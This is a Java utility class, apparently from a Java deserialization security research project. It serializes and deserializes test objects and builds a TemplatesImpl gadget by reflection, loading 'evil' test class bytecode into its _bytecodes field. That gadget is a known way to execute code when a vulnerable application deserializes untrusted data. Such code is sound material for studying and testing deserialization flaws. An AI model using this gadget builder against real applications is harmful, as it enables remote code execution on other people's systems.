package org.su18.serialize.utils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.*;
import java.lang.reflect.Field;

/**
 * @author su18
 */
public class SerializeUtil {


	/**
	 * 将序列化对象写入到文件中
	 *
	 * @param o 对象
	 * @throws IOException 抛出 io 异常
	 */
	public static void writeObjectToFile(Object o) throws IOException {

		String className = CallUtil.getCallClassName();

		if (className != null) {
			FileOutputStream   fos = new FileOutputStream(genFilename(className));
			ObjectOutputStream oos = new ObjectOutputStream(fos);
			oos.writeObject(o);
			fos.flush();
			fos.close();
			oos.flush();
			oos.close();
		}
	}

	/**
	 * 从文件中读取序列化对象
	 *
	 * @return 返回序列化对象
	 * @throws IOException            抛出异常
	 * @throws ClassNotFoundException 抛出异常
	 */
	public static Object readFileObject() throws IOException, ClassNotFoundException {

		String className = CallUtil.getCallClassName();
		if (className != null) {

			ObjectInputStream ois = new ObjectInputStream(new FileInputStream(genFilename(className)));
			return ois.readObject();
		}

		return new Object();
	}


	/**
	 * 生成测试用恶意类字节码
	 *
	 * @return 返回恶意类字节码数组
	 */
	public static byte[] generateEvilClassForTest() throws Exception {
		InputStream inputStream = SerializeUtil.class.getResourceAsStream("../test/EvilClass.class");
		assert inputStream != null;
		byte[] bytes = new byte[inputStream.available()];
		inputStream.read(bytes);
		return bytes;
	}


	/**
	 * 构造反序列化 TemplatesImpl 类对象
	 *
	 * @return 返回 TemplatesImpl 对象
	 * @throws Exception 抛出异常
	 */
	public static TemplatesImpl generateTemplatesImpl() throws Exception {
		// 初始化 TemplatesImpl 对象
		TemplatesImpl tmpl      = new TemplatesImpl();
		Field         bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
		bytecodes.setAccessible(true);
		bytecodes.set(tmpl, new byte[][]{generateEvilClassForTest()});
		// _name 不能为空
		Field name = TemplatesImpl.class.getDeclaredField("_name");
		name.setAccessible(true);
		name.set(tmpl, "su18");
		// _tfactory 不能为空，兼容多个版本
		Field factory = TemplatesImpl.class.getDeclaredField("_tfactory");
		factory.setAccessible(true);
		factory.set(tmpl, new TransformerFactoryImpl());

		return tmpl;
	}


	/**
	 * 根据类名生成序列化测试文件
	 *
	 * @return 返回类名
	 */
	public static String genFilename(String className) {
		String[] splits = className.split("\\.");
		return splits[splits.length - 1] + ".bin";
	}

}
